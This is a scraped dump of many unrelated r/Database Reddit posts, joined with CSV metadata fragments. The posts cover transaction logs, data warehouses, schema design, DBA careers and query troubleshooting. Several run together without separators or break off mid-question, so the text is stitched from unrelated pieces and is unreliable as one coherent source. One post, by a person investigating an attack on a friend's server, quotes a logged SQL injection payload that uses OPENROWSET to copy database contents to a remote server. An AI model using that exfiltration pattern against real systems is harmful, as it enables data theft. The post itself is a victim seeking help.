1319503593.0,40,self.Database,lnskq,"SQL Server's Transaction Log - Why you need one, and what it does.",47,7,21,http://www.reddit.com/r/Database/comments/lnskq/sql_servers_transaction_log_why_you_need_one_and/,"I started to write a reply to [lockes, who was asking about why we need a transaction log](http://www.reddit.com/r/UniversityofReddit/comments/lhwnv/request_introduction_to_sql_server/c2u1huo). It was long enough, so I figured I'd share it here.

-------------------------------------------------------------------------  

The transaction log is perhaps one of the most misunderstood parts of SQL Server's architecture, and is one of the most integral components of each database.

**Why do we need a transaction log?** Consider the ACID properties of transactions: Atomicity, Consistency, Isolation, Durability (http://en.wikipedia.org/wiki/ACID). Durability is the property that the transaction log assists us with - ""once a transaction has been committed, it will remain so."" The effect of this, is once your database engine tells you that the transaction is complete, it HAS to stay that way. This means that the transaction must be stored on disk, otherwise, if you have a power failure and your change was only in memory on the database server, you may restart your database engine and find that your change wasn't persisted.

OK, so we have to write the changes to disk before we can return a successful commit back to the application. A SQL Server database stores its rows on 8 KB pages, which can be laid out anywhere in the data file (.mdf or .ndf file extensions). A page can hold many rows (if each row is 20 bytes, you can fit about 400 rows on the page). Pages are the smallest unit of reading and writing, so if you modify one row on the page, the entire 8 KB page is written back to disk. 

Imagine if you update 100 rows in a single transaction (**UPDATE Products SET Price = Price + 1**). Some of these rows could be at the start of the data file, some in the middle, and some at the end. You would need to drag the disk head to each position on the disk, write the updated page to disk (an 8 KB write), and move onto the next location, waiting for the disk to spin, and the disk head to move each time. 

-------------------------------------------------------------------------  

Enter the transaction log. Instead of making a randomly placed 8 KB write for each page that needs changing, the transaction log is a sequential file, capable of writing in 512 byte sectors (a sector being the smallest sized disk write operation). As it's sequential, you don't need to wait for the disk head to move to the next position to write the next change - the next position is already right under the disk head. This means you can lay the changes down on disk very rapidly, which keeps the end user happy. 

While we are writing the change to the transaction log, we're also updating the in-memory version of the data page. Later on, a process named the Lazy Writer will come and commit these ""dirty"" data pages to disk. If you lose power, then all the dirty data pages in memory will be lost, but we have a record of all changes that occurred in the database. Each operation in the transaction log has a Log Sequence Number (LSN), which is like the odometer in your car - it's a unique, ever increasing number. Each data page records which LSN was last used on that page, and when the database starts up, it will scan through the transaction log, and check to see that each operation in the log has been changed on the data page (i.e., the Lazy Writer successfully wrote that page back to disk). If it hasn't, the change is made to the data page again (not re-written to the transaction log). The end result is that the database is back in a consistent state.

Note that we can also rollback a transaction. This is controlled by the transaction log storing the previous value as well as the changed value. If the transaction is rolled back, the transaction log is read to get the previous value, and a new transaction log record is written to say that the row has been changed to the old value (in case the uncommitted value has been stored back to disk by the Lazy Writer- imagine a very long transaction of minutes or hours).

-------------------------------------------------------------------------  

To re-iterate, the two main reasons for the transaction log are:

1. Performance
2. Durability

So, the transaction log is simply a list of all changes that have occurred in the database, whether data changes (as in our UPDATE example), or structural changes (grow a data file, or create new objects). This also gives us the ability to replay any operation that occurred in the database. If we take a copy of the database (a full backup), and then have copies of the transaction log from that point on, we can replay every operation and bring the database back to a consistent state at any point in time. For example, if you accidentally dropped a table, you can bring the database back to the point just before (either by a time (2:45pm), or by a specific LSN), and recover the data.

Another option is the concept of ""log shipping"". This is where you take your transaction log backups, and routinely (every few minutes) restore them onto another server. In the event of a distaster, you have a warm standby copy of the database ready to bring online.

This is a good place to take a rest.  

--------------------------------------------------------------

To avoid running out of space, the transaction log needs to be reused at some point. At what point? How do we trigger this? This leads us to the concept of database recovery models, and the two most common are the ""Full"" recovery model and the ""Simple"" recovery model.

The **Full** recovery model puts all control onto the DBA. When you backup the transaction log, it will write the as-yet-un-backed-up log records to a backup file, and then remove (""truncate"") the log. It will only truncate the log back to the point of the earliest open transaction, because it may need all the log records to roll back this transaction after the backup. If you don't back up the transaction log while in the Full recovery model, your log will continue to grow until you run out of space.

The **Simple** recovery model makes every thing easy. You don't back up the transaction log. When the log runs a ""checkpoint"" operation (triggered either by the DBA running ""CHECKPOINT"", or the log reaching 70% full), all dirty pages are flushed to disk, and the transaction log will be truncated (again, up to the point of the earliest open transaction). As you are not taking backups of the transaction log, you have no ability to restore to a specific point in time, as you don't have a complete log chain from the time of a full backup. The Simple transaction log only stores enough information to recover in the event of a loss of power.

There is another recovery model, **Bulk Logged**, which is similar to Full, but used when loading a large amount of data. It will log the changed extents (an extent is 8 pages, or 64 KB). This can be a lot more efficient than logging ""now change this row, now change this row, now change this row"", which could add up to more than 64 KB inside the log.

Every company has them - the group that's building ""The Data Warehouse"" that will answer all questions, and the ones who show up any time one of these magic phrases are uttered:

- Business Intelligence
- OLAP
- Analytics
- Dashboard

Here's my problem - in seventeen years, at over a dozen companies, ""the data warehouse"" has always been a work in progress. Most of the time it wasn't even near implementation - they were still deep in analysis. (Though every single time they had figured out they needed a lot of expensive Oracle software!) Many times they had also already chosen their BI toolset (usually Business Objects or Cognos). 

In every case, whether the DW was still in process or actually complete, I found it to be utterly useless. Either they couldn't provide the data I needed, or I wasn't allowed access to it, or they would have to build me a datamart that would cost tens of thousands of dollars. 

So all this time and money went into something that probably serves an executive dashboard, some accounting reports, and little else. Any other business need was not only not answered by the DW, but the DW mafia continued to block any attempts to form any other kind of analytics. My most recent customer had SQL Server Analysis Services set up, SharePoint and PerformancePoint deployed, and the Cognos Mafia *still* prevented them from actually building cubes. Twelve months later, Cognos hasn't provided anything of value - they're still in analysis. 

Far too often it just seems like DW initiatives are ""because the business needs a data warehouse"" without any actual *business* justification. They completely lose sight of why they exist. 

I think I'm going to do more research to find companies that ignored the idea of a DW and just built data marts as needed. Or see if there are any groups that grew a DW organically - creating data marts, merging them, etc. 

Honestly, wouldn't that be an agile approach to creating a DW instead of the Big Up Front waterfall approach that has been the downfall of so many massive software projects?",,False,self,t5_2qian,False,,,True,t3_119bun,http://www.reddit.com/r/Database/comments/119bun/im_tired_of_data_warehouses/,

Our boss seems perfectly fine with it.  He puts on the pressure and expects results on time when we've got work, but at idle times doesn't say a peep or bother us in any way.

Everyone always talks about ""learn to backup"" (level 0/Full, incremental, differential). But there are several ways of doing this:

 * Learn to take Filesystem snapshots with your relevant OS, or storage solution i.e. XFS, Netapp
 * Use the built-in backup tools, before 3rd party solutions.
 * learn to restore a database USING TRANSACTION/BINARY LOGS. People will think you are a wizard when you can restore a level 0 backup from the previous night, then replay the logs 5 minutes before the server went boom.

My last words of advice, learn the relational model, argue the shit out of everything with developers and even other DBA's. Most DBA's including myself know C pretty well, and a lot of the lower level tuning needed in your favourite UNIX/Linux + filesystem combo. Lazy non-normalized databases are never a good excuse.
More often I found myself in a situation with Sysadmins or department heads asking me to make the database faster, to which I normally respond ""It's very fast, it's the shitty code that's slow. Tell the developers to make their code and design faster!"". Developers just *love* a collation of slow transaction logs and blocking transations...makes a perfect secret santa gift.

Anyone else have some lesser-known, better advice? I wanted to point out manuals, documentations, and papers as these really are the best sources of knowledge.

My initial reaction to these things has been, ""God. Damn. Everything."" And generally, I have cursed them to the high heavens.

But, as I (slowly) grow more accustomed to how they work, and as I spend more and more time working with databases, I find myself genuinely enjoying the idea of using them, despite how much of a pain they seem to be.

I feel like this is rather odd. I mean, the languages are still frustrating at this point, but I am genuinely excited at the prospect of creating a database for, say, my personal movie collection. Or my games. Or the cards in any one of the card games I play.

I'm not even sure why. I just think it'd be extra cool to have my movie collection cataloged, and then have it set up so I can search for movies by genre, or director, or *whatever*.

I guess there's no real purpose to this post. I just find my current fascination with databases interesting/horrifying, and decided to share.

(How fortuitous that there is, as always, a relevant sub-reddit :p)

We have everything going on here, from stored procedures that dynamically create new stored procedures that generate dynamic select statements to views nested 7-8 layers deep, from huge tables with indexes and no clustered keys to nearly every table containing a column with comma or pipe-delimited values, which are used for joining via a custom function. It was all done 10 years ago by a ColdFusion 'expert' who, it seems, had no intent on the app actually being successful.

Attempts have been made to rewrite the software and rearchitect the database, but those apparently failed after several years and several millions of dollars.

I'm currently just trying to make sense out of this mess in a horribly misguided attempt to build a data warehouse, just so that our salespeople don't have to manually track their sales and expected commissions in Excel, our accounting could actually stand up to an audit, or even so that we know how the business is doing other than going by the 'gut feel' of the owner. I shit you not. This is a $10m/year business with 50 employees.

Anyhoo, every couple of months the owner (who used to be a FoxPro developer in the early 90's) will come up to me and strongly hint that the solution to all of our problems would be a database diagram on the wall, just like he used to do when he wrote code. Today I was ready for him. 

Him: Whatcha workin' on?

Me: Trying to make sense out of this table..

Him: Ah...HEY, you know what would be cool? A diagram of the database on the wall! That always helped me when I coded!

I've done this before, even installing the COM Automation function and setting up a trigger. I wouldn't call myself an expert in Oracle, but I'm not dumb about it.

This time I had Oracle successfully installed and listening to network requests just fine, but a colleague wanted to do a trigger. I had to install the COM Automation add-on, so I ran the installer which failed because our VM only had 20G of hard drive space (a fucking joke), 1G remaining. I went through and cleaned a few files out and got up to 3G of space. Trying the installer again failed, so I had someone else bump up the space on the VM to 30G.

Since the installation failed halfway through, it thoroughly messed up Java, so I could no longer use the Universal Installer. I had to download the app again, copy it to a drive on another computer in that VM network, then start it from there. This installer allowed me to uninstall Oracle, but of course Oracle left remnants of itself behind.

I tried to install Oracle again but those remnants prevented the listener from installing properly. I decided to uninstall completely and remove all traces of Oracle by using some instructions from the net.

Now, with a clean system and plenty of space, everything installs but I still can't get the listener to start up right. It's a pain in the ass that an application makes you go through this many hoops.

My question is, when do I choose a relational DB, and when do I use a NoSQL like CouchDB, MongoDB, etc.

I realize there are pros and cons to each, and you should choose the right technology for your project.

I would also like to know specifically how to deal with coming from a SQL background to wrap my head around the NoSQL way of doing things. Primary keys, associations, foreign keys, etc. I.e. If I have a table of posts that list an author as a field, how do I find all posts from a particular author? in the SQL world, one would use a join or additional SQL query. Are there any resources available to ""recondition"" someone coming from SQL?

That's about it.  A graphical relationship tool would be nice, but not critical.

Something like phpmyadmin for mysql would be right out as it requires a separate running http server with php dependency.  And, Navicat - what I've been relying on up until now - seems to have discontinued releasing their free 'lite' versions.

I'm currently testing this on MySQL but I'm open to any suggestions and different approaches.

Nature of the data is:

 - text label (up to 200 characters)
 - value (int)

Each data row belongs to a category, these are divided by country, category and type. Category is either completed or not (meaning the data in it is complete). My table schema is here [pastebin](http://pastebin.com/Pi7VbMGf), all tables are InnoDB (although I'm not using foreign keys).

The query that will be used most on the data is:

    select ref.label
         , data.date_checked 
         , cats.country_code, cats.category, cats.type, cats.positions, cats.completed
         , data.value
      from ref ref
      join data data
        on data.data_id = ref.id
      join data_categories cats
        on cats.country_code = data.country_code
       and cats.category = data.category
       and cats.type = data.type
       and date(cats.date_checked) = date(data.date_checked)
     where ref.label = 'my data label'
    
ref.id and data.data_id are of binary(16) type and store an unhexed MD5 hash of the label; the label reoccurs in the data set - 189759 unique labels in 3877629 data items and there won't be many new labels.

Indexes, besides primary keys:

- data.data_id - non unique
- ref.label - unique
- (data_categories.country_code, data_categories.category, data_categories.type) - compound, non unique

Here's the EXPLAIN on the query - [pastebin raw](http://pastebin.com/raw.php?i=Hzy52wSf) and profiling info from phpmyadmin [imgur](http://i.imgur.com/3OWVU6w.png). It takes ~5 ms to execute this query over 3877629 data items on a freshly restarted database with no other load on the machine but that's my PC with ssd disk, etc. My target environment won't be operating under perfect conditions.

5 ms is good, far better than I expected for almost 4 million data items. But that's only two days worth of data so what will happen in 6 months? Are there any obvious bottlenecks here, anything I could have done better? Maybe MySQL is not really suited for this and I should be using something else? Paid solutions are out of the question for me unfortunately.

One obvious optimization would be to normalize category data. I took the current approach because data table contains all the relevant information now, if the application querying the database knows the exact label and doesn't need the category data, it allows for a query on data table alone.

I know it's a long post but I didn't know how to explain myself better. I would greatly appreciate any advice on the issue, it's been a while since I've played with databases.

What is the best major to pick. I am a student at the University of South Florida and no advisers seem to know and they keep just pointing me to BS websites that don't help at all. I go to the College of engineering and they tell me the degrees I can get but not which one would be best to be a DBA. They send me to the career center and I get this. 

""Dear (Umbralspace),
 
You contacted the Career Center regarding possible majors to correspond with the occupation of Data Base Engineer.  On your card, you indicated BSCE (BS in Computer Engineering, I assume), Bachelor of Science in Information Technology, and Bachelor of Science in Management Information Systems.
 
Your best bet is to do two things:  research the occupation and research the majors.
 
You can go to www.onetonline.org and type in Data Base Engineer in the keyword section.  You will discover information on tasks, skills, education required and salary information for not only this occupation, but also for a multitude of other occupations.
 
After you have discovered Data Base Engineer educational requirements, you can go into Degree Works and compare the USF curricula for Computer Engineering, Information Technology and MIS in connection with the educational requirements that you have fulfilled so far.  Computer  Engineering is by far the most complicated major of the three majors you were interested in due to heavy math and science course requirements.  Information Technology and MIS are more similar to each other.  Duties include working with end users to maintain systems, not create them.
 
If you would like further information on these majors, I suggest that you contact academic advisors in the College of Engineering (BSCE) and Business (MIS) as soon as possible.
 
Please contact me if you need further guidance.
""

SO they are sending me back to engineering. WHAT BS! PLEASE help guys I don't want to throw away thousands on a degree that wont help me.

I was looking into career options for Computer Science grads and came across database administration. The median salary looks pretty high and the job outlook and security to seem to be promising. Has anyone had experience as a DBA? Can anyone give me any insight into what a career as a database administrator is like? I can't seem to find that much information online and would like some first hand accounts. How does one become a DBA? Are there certifications? Do you have to work your way up a latter to the position or can you be hired right after graduation?  

I had absolutely no problem acing an introductory database course and I have the option to take a few other database courses before I graduate. I don't want to waste my time if working with databases is actually a bad career choice.

I am beginning to worry. I feel like even with a 4.0 in my major, I don't know that much about computers. Well, actually, let me reword that. I know a lot about computers, just nothing specialized. I know a little bit about a variety of different things, but there isn't one subfield of computer science that I feel I particularly excel in. I am looking for a subfield of computer science to focus my studies on and specialize, but I don't know what that field should be!

I have set up a database, but I am a little unsure about the design/relationships  
[here is a screen shot of the DB relationship](http://i.imgur.com/iU6tvIs.jpg)  
.  
general overview:  
Patients have one or many visits, and on each visit, they have single or multiple diagnosis (flu, fracture, etc) and they have single or multiple procedures(blood drawn, xray, consultation, etc)  
there is no cost for diagnosis, but each procedure has a cost.  
the overall goal is to calculate the total procedure cost, subtract the total co-pay amount, and find out the balance, which is what the insurance company owes.  
.  
essentially, I have come up with 4 main tables:  
**Patients** - simple patient info (name, dob, address) and an entry to the visits table  
**visits** - is a list of all visits for a given patient. keeps track of the total charges of the procedures and points to the procedures and diagnosis tables  
**diagnosis** - keeps track of all the diagnosis for a given visit  
**procedures** - keeps track of all the procedures performed  
.  
i think this design is correct, but I wanted to verify it before i attempted to make forms for the database.  
currently I'm using open office base because it is free, and i'll be making front end forms in writer once i nail down the DB design

And so on.

 It's also a difficult problem, because it requires fairly fine-grained and well-tuned matching. For best results you should use fuzzy comparators like Levenshtein, which are O(n^2). And, potentially, you need to match all records with all other records, which is also O(n^2). So you have a rapidly increasing number of comparisons, all of which are slow.

 It turns out there's a whole field of theory on this (called record linkage), so for one case where I had this problem, I sat down and wrote a reusable Java engine for linking records, called Duke. After working on it for 18 months I released version 1.0 today.

I work for an airport, which has an appalling piece of bespoke database software which they use for billing and to track their activities.

I haven't actually been tasked to fix this, since it's not my job, however I know more about software than anyone else there, and since I use this terrible piece of software dozens of times a day, I have the incentive to do something about it.
 
I have an amateur-level knowledge of programming (pretty much just Java and JS though), and absolutely no experience with databases. I'm looking for a Zoho-type thing that I can use to build a multi-user database and web app to access/update/input data through forms. I would like some kind of spreadsheet view of the database as well.
 
I need to print invoices for customers (for paying landing fees, etc) and produce user-definable reports - ""how many aircraft landed on runway x between this date and that date,"" or ""how many landings were made by this aircraft in 2012,"" etc.
 
The reason I'm erring on Zoho already after playing with it some, is that it doesn't seem to allow forms to have fields dynamically added. 

Each flight has an arbitrary number of miscellaneous charges that may be added to it, so I want to be able to select a misc charge, say from a drop-down, then click a ""+"" button which will add an identical field from which I can select another misc charge, ad infinitum.
 
I certainly have the programming skills to build a database client, which I'm starting to lean towards. I would have no problem building the exact interface I need. However, since (again) I know nothing about databases, I don't know what I should be using for the back end.

My first stop was SQL Server Express since it's free, and pretty much all my employer cares about is money (odd, since they're paying ~$100k annually to run their current, awful solution). However, it's possible this ""movement"" data constitutes commercially sensitive information, so I'd like to explore local storage options as well.

The system would likely only be used by ~10 users on site, although since most of them would be employees of various aircraft operators based there, most connections would be WAN connections. This is fine, because I'd like a web-based component to allow pilots to book flights online. The airport only averages about 150-200 flights a day, so I wouldn't expect this database to be updated or accessed by more than, say, 10 users simultaneously.

I feel stupid asking this, but is this something that could be serviced by (say) MySQL running on a dedicated desktop machine?",,False,self,t5_2qian,False,,,True,t3_1j1g8v,http://www.reddit.com/r/Database/comments/1j1g8v/newbie_wants_to_build_online_database_has_little/,

I tried searching for this and wasn't able to see anything pertaining to it.

Basically I take online courses through Rio Salado, they currently offer a mySQL course and their SQL server database course is pending (they likely won't offer it until fall).

I am currently positioning myself for promotion with my current employer and so far have taken VB, C#, and a Sharepoint class.  I've also taken a basic flowcharting class for programming and a basic IT class.

I know that learning SQL will be helpful in any position I'm going for as we use SQL server, I don't believe we use mySQL.

So should I hold out for SQL Server Database class, or at this moment in time would the mySQL class be just as beneficial in the short term?

&gt;Outright Customer,
&gt;
&gt;We apologize that the Outright service did not have updated data for several days. You use Outright to run your business with up-to-date, accurate data and we wanted to let you know what happened, and that it’s been fixed. As of Monday, September 10 around 7:30pm PDT, Outright was back up and all data is now up to date. You can log in now to see your current information.
&gt;
&gt;What happened?
&gt;
&gt;Starting Thursday, September 6 around 7:00am PDT, Outright was unable to import data from linked accounts. Adding and Editing transactions was also not working.
&gt;
&gt;This outage was due to a database field capacity issue. Essentially, our database ran out of numerical combinations for creating new records. A new record is required each time data is imported. We knew we were approaching the limit, and have been working on expanding the database. Unfortunately, we missed some key elements and the system halted while we implemented the fix.
&gt;
&gt;The error was preventable and we recognize that it’s not the level of service you expect us to provide. Our team has learned from this mistake and is putting the checkpoints in place to make sure this specific issue doesn’t happen again.
&gt;
&gt;Please reach out to me at ********@******.*** if you have any questions or concerns about your Outright service. I read every email and want to hear from you.

I have always found that versioning a database schema can be a little more tricky that the source code. As a database grows it sometimes changes its structure, adding tables, dropping columns etc. 

Since the changing definition of a schema directly affects the data the database holds and it can render a sql dump at least hard to use.

Do you just keep the latest version of a schema or you just add your table / database changes at the bottom of your sql dump ? Does this problem (or solution ) even has a name ?


EDIT1: Thanks for the answers. They are most usefull. As a followup
Is there a DBA topic on this matter? I get the feeling that there needs to be some information that is platform independent ?

1376135191.0,6,self.Database,1k32ol,[SQLite] How to structure a query with Left Join before Left Join for a many-to-many relationship (I think?),7,1,4,http://www.reddit.com/r/Database/comments/1k32ol/sqlite_how_to_structure_a_query_with_left_join/,"Hello,  I'm not really sure what to call it, but I would like to join two tables into another table.  Partly as a learning experience and partly out of necessity, I am working on building an IP database.  I have a table for server, ip, subnet, and vlan.  Then I have tables that correlate vlan &lt;-&gt; subnet, subnet &lt;-&gt; ip, and server &lt;-&gt; ip (I'd call this a many to many relationship, but I'm not sure that's entirely correct as they are really many to one relationships).

I would like to create a query to show the ip, subnet (network, gateway, broadcast) and vlan id.
My query that is failing (with error Error: near line 150: ambiguous column name: subnet.network)

    /* Trying to get IPs and VLANs */
    SELECT ip.ip, subnet.network, subnet.gateway, subnet.broadcast, subnet.prefix, subnet.netmask, vlan.vlan
    FROM ip
    LEFT JOIN ip_subnet ON ip.id = ip_subnet.ip_id
    LEFT JOIN subnet ON ip_subnet.subnet_id = subnet.id
    LEFT JOIN vlan_ips ON vlan.id = vlan_ips.vlan_id
    LEFT JOIN subnet ON vlan_ips.subnet_id = subnet.id;

The error is rather ambiguous because if i remove subnet.network I get an error that another column name is ambiguous.  

I think my problem is I'm not groking the left join, but I'm really not certain.  Can someone please provide some guidance as to what I'm missing?  Thanks!

EDIT:

Ok, I think I figured it out:

    SELECT ip.ip, subnet.network, subnet.gateway, subnet.broadcast, vlan.vlan
    FROM ip
    LEFT JOIN ip_subnet ON ip.id = ip_subnet.ip_id
    LEFT JOIN subnet ON ip_subnet.subnet_id = subnet.id
    LEFT JOIN vlan_subnets ON subnet.id = vlan_subnets.subnet_id
    LEFT JOIN vlan ON vlan_subnets.vlan_id = vlan.id;

I also renamed the table `vlan_ips` to the more aptly named `vlan_subnets`

I've created [a gist of my SQL](https://gist.github.com/three18ti/6200127) and have included it below for your convenience.   While my primary question is about how to structure this query, I'd greatly appreciate any other feedback, comments, or advice that comes to mind.

The primary key of my reference table is a varchar containing usernames. The rest of the table has info on that user. A friend pointed out that using a text field will be much less space efficient than say, using an incrementing integer as the reference. I always assumed foreign keys acted more like a pointer to the data rather than just checking the data is in the referenced table and inserting what essentially is a copy in the main table.

I don't really want to use an integer because if I want to just get the username along with the other data in the main table I also have to look at the other table to see what the integer corresponds to. I would just receive the correct data from the main table if I reference the text field directly.

TLDR; Should surrogate keys(integers) be used for foreign keys?

I need some guidance on getting a consultant to set up a project management/history database and front-end. ,8,1,13,http://www.reddit.com/r/Database/comments/zvto7/i_work_for_an_international_architectural/,"Fist off, we have two main offices in the US and individual designers working from their own homes or offices in China and Dubai with less that 30 employees in total. 

Our company's basic task is to specify lighting products (light fixtures and control systems) for architectural projects (hotels, restaurants, theme parks), place those elements on architectural plans, and maintain associated lists/schedules (quantity of fixtures, general circuiting, power usage for meeting energy codes) of all of this. Currently we are making and maintaining all these schedules manually in Excel and its wasting a lot of time and effort. 

It is my opinion that we would want some form of database (cloud based, possibly) so that all designers, regardless of location, have access to a central repository of projects and a front-end interface *that is easy for a designer to use* while working on their individual projects.

I am creating an outline of how we would want our database to be organized and how that information would need to be referenced/maintained. Basically, it would include project management, lighting products used on each project (along with details mentioned previously) and a history of products used on previous projects for easy inclusion on new/current projects. There are a lot of other details specific to our company that would need to be taken into account, but I dont think they need to be pointed out in this post. 

I am the closest thing our company has to 'in-house IT' and while I have some programming experience, this is way out of my league and IMO should be handled by an outside consultant.

What type of consultant should we be looking for? A database programmer?

Can an individual Freelancer handle a task like this AND provide support/modification of the front and back-end? 

Do we have to look for a larger company that specializes in this kind of thing?

What would be a guesstimate for the cost of such a database, a server, and support?

I really appreciate any guidance on this, as all the senior designers are meeting next week to discuss issues such as this and I think it would make things a lot easier for everyone.

My users have a semi user friendly query generator, which takes a ton of burden off of me for making their adhoc queries, but we've had some slowdown lately. I've addressed most of the issues through defragging indexes and adding new indexes through the query optimizer*, and it's running smoothly again, but the query editor defaults to Like 'value%' for queries that should be =. (example ""contact.status like 'active%' when the only status we have that looks like ""active"" is ""active"")

How much is this going to increase a query of 10k-50k records, assuming this query is run every second or two (with over 150 users and a lot of data refreshes it adds up). Is this something i should worry about or is it marginal compared to good indexing and joins?

Also if a like query is run against an indexed field, does that remove the efficiency the index provides?

*I may be referencing the program by the wrong name. The program where you log all the sql transactions over a period of time, then run them through the analyzer and it advises you what you should put indexes on.

I know a bit about SQL/relational databases, but not a lot. 


Basically, I've got sensors (strain gauges, accelerometers, GPS, etc) that constantly generate multiple streams of data. This data is processed and then saved in a new file every five minutes. So you end up with thousands of files, and doing any processing or analysis is a pain in the ass. 


So I'd like to get all this data into one place. Basically, I'd be inserting batches of data into the database every five minutes when new files come in. That would include the time for each sample as well as the numeric data itself. There would be also be multiple channels of data.


Would SQLite be okay for this? I imagine the table would have columns like (time,channel,data).
I would like to be able to access any chosen channel+time period quickly, regardless of how large the database is. This would require indexing, right? But if I'm adding data every five minutes, would it have to constantly re-index? Can I somehow exploit the ordered nature of the data? Would it be better  to have a separate table for each channel? Or perhaps there is something more appropriate than a relational database? 


Summary of requirements -

1) Write often (every 5 minutes)

2) Simultaneous read/write

3) Store lots of numeric data

4) Retrieve this data fast. Selection based on time+channel.


Thoughts?

They're currently using Hyperion to pull data from Oracle, then manually entering it into Access. It's clunky and horrible. In Q2 2014, we're upgrading to R12 of Oracle.

Do you have any recommendations for an off-the-shelf database we could buy? Our team doesn't really want to spend the time coding a new database from scratch, but Access crashes when we start to get over 50Mb of data in there. 

I realize this is fairly vague. I got asked to look into this yesterday and am really just looking for a place to start. I'm hoping someone has had a good experience with a database, or a not-too-terrible experience and can point me in the right direction.

The essence of the situation is this:  a single conceptual table with roughly as many reads and deletes as inserts.  One column is an enumeration limited to about a dozen distinct strings.  His idea is to split the single table into twelve different tables, each named with one of the different strings.  This way, if there happens to be heavy traffic on one of the tables, the others will continue to perform as normal.

From what I can tell, there has been no measurement of any sort to support these speculations.

From looking at the plan, it seems that the Oracle parser is combining ""a.customer_key = b.customer_key"" and ""b.customer_key is null"" into ""a.customer_key is null"" in order to use an index on CUSTOMER.customer_key.

This isn't just about making a tutorial for the game, if all goes well I would love for this to become a good resource for learning SQL and other database concepts too.

If you have some time to kill, please take a look at the new tutorial at https://schemaverse.com/tutorial/tutorial.php

Any criticism, bugs, questions, etc would be awesome.

My company is currently in the process of moving our legacy flat-file database architecture to a dimensional data warehouse model. I work as a Data Analyst creating reports from these databases, and am tasked with learning how to continue to do so under this new architecture.

However, it is proving difficult for me to wrap my brain around.

when I craft a query to pull claims, for instance, It will return a number of duplicate entries where a column will have an odd suffix appended to it (i.e. DOVE809, JOHN  the 809 in this case). Our DBA told me that is an attribute of working with a data warehouse, vs a server with a flat file set up.

The sample below, returns a number of duplicate, and seemingly trash entries. I was told that I should try to conceptualize working with a EDW vs a normal environment, which has been difficult.

Anyone have similar experiences, or advice? It would greatly appreciated. 

Also, I've been tasked with researching SSRS training material costs, and alternatives, anyone know of a good software based training resource?
Here is a sample query that I'm trying to recreate in the new EDW.
    select distinct a.PersonName,

While helping my friend with his server, I came a cross a recent SQL injection attack in the his web logs. When I converted the Hex query into ASCII, I saw the full query complete with remote database credentials.  It was something like this:

    insert into OPENROWSET('SQLoledb','uid=;pwd=;Network=DBMSSOCN;Address=;', 'select T1 from TABLE') select convert(text,text) from syscomments where id=object_id('stored_procedure')


I connected to attacker's database server using MSSQL SMS, and found the 'TABLE' but it was empty. While my friend is patching the hole, I am looking to see if the attacker stole any data from him. It is worrying to see that he did manage to steal from bunch of other web sites.

Q1) If the query above times out, would that still create an empty table? I am hoping the attacker failed and ended up with an empty table.

The server seems to belong to a hosting company in UK. Some of the databases in this server look real and serving data for the web sites  that are also being hosted by the same hosting company. The attacker used a login that is under a role of sysadmin, and he stored his stolen data in Master database. This suggests that attacker is either part of the hosting company, or he hacked them to get a sysadmin login.

Q2) Opinion about the hosting company's involvement?

And finally, their SQL logs. They show no activity by this user (only backup related)  Is there any way to see if the hacker achieved anything recently?

We already submit this to IC3, and mentioned to the hosting company in UK. Not sure what else to do. I also took some screenshots showing the login role, database and table list.

I'm a novice with database development so I initially developed the database with tables that were not connected and now I'm at a point where everything works fine.  Its a fairly simple database (fourteen tables, all less than ten columns) and I honestly don't know why I should take the time to create the relationships so I'm looking for the reasoning behind it.  I came up short on a few google searches so I came here looking for clarification.  

It is set up so that every table has a primary key and any place there would be a relationship already has a field that would act as a foreign key (I know a little!), I just don't know why they NEED to have a relationship.

Currently, I am a DB2 and Sybase on AIX DBA.  My company (I would like to keep it anonymous, but I will say it's a large Fortune 50) is phasing out both of these products and moving to an Oracle/SQL Server environment which will merge my group into the existing Oracle/SQL server group.  Our Teradata team recently lost someone and the manager of that team asked my manager if I would be willing to move over to the Teradata team.  They said that they would pay for full training so experience really isn't an issue.  My existing team would also get full vendor training with Oracle/SQL Server once the merge happens.  

I am a 25 year old with a BS in CS and have spent the last 3 years working with midrange database products in a *nix environment.  I have heard that Teradata is a completely different animal which makes me a bit nervous that I would essentially have to start from scratch (save for my relational database and SQL concepts).  

My questions:
1) Would it be a good move in terms of career opportunities in the future?
2) Is Teradata a solid platform with a large user group such as Oracle?

Great news, after many years of working in the restaurant industry I am near completion on a two year degree from a community college in database management. Prior to this I have a two year liberal arts degree. With my graduation close at hand I have begun applying at any beginner and entry level position I find that matches up with what I have learned. I’ve recently finished a phone interview with a tech-savvy recruiter who asked me some basic database theory and technical questions. She seemed pleased at my replies and we have arranged for a meeting with the company CEO this Tuesday. 


The company is small; they make web-based business software targeted for legal firms. The position is for a junior SQL developer and based off of their description it includes developing SQL scripts for data migration, data validation, and testing. 

After years spent as a restaurant manager I have no experience with interviews of this kind. I have a good friend from a bank HR department giving me tips on basic interview etiquette, but I am wondering if there is any advice you guys could offer? Specifically, what kind of questions should I expect, are there any do’s and don’ts in any interview for this type of work? Etc. Thanks for any help! If there is any help I can provide to you or to r/database don’t hesitate to ask!


TL;DR Gotta interview for a SQL Developer/script writing job. Got any tips?!?!

I've also looked into Sphinx but I couldn't find a Sphinx For Dummies-style instruction guide.

I had originally thought to do this in excel (well really, linux clones or google docs) first column the entry, second the ranking, third a category, fourth another category etc etc.  However before I start this I want to see if r/database thinks this makes sense.  

Will excel become too slow too fast with semi long written entries?  Would it make more sense to learn some sort of database software such as mysql or what not for this?  How hard would this be to learn?  Is there a good chance of me messing up and deleting the whole database if I learn something and am a beginner?

Is there any (easy) way to move these documents and data over to something else? something open source? I'd prefer to be on Ubuntu (this database is the last thing keeping me on an old apple) but I'm open to any suggestions. Is there some open source fork of appleworks for linux?! (hah)

I do know a decent amount about normalization, when it's OK not to be 100% normalized, and when to index fields...

However, I'm entirely self taught, and I've never delved into something that I should probably understand better...  I haven't had to worry about efficiency too much because I haven't built anything that got loads of traffic... but if all goes well, I'm about to...

So here's what I've got right now...  5 related tables, slightly simplified for explanation's sake (in reality there are more tables, but for now let's not worry about that)...  Basically, I'm listing a bunch of concerts, each with a bunch of simple data, a list of bands and a total number of people who have RSVPed to attend.

shows - has an eventid, metadata about an event (time, date).. 

show_rsvps - has an entry with eventid and a userid for each user attending eventid

venues - has venueid, info about each venue

bands - has a bandid, info about each band

shows_bands - has an eventid listed X times for each of X bandids  (so for event 1 with bands 1, 2, 3 playing in that same order, we'd have [1,1,1],[1,2,2],[1,3,3]) ...

So, for a typical query, I'll select values from events where eventdate is between startdate and enddate...  I'll join venues on events.venueid=venues.id to hook that data up... I'll hook up shows_rsvps on eventid and do a count(userid) as totalusers - grouping by eventid to prevent duplicate output... and herein lies the problem... 

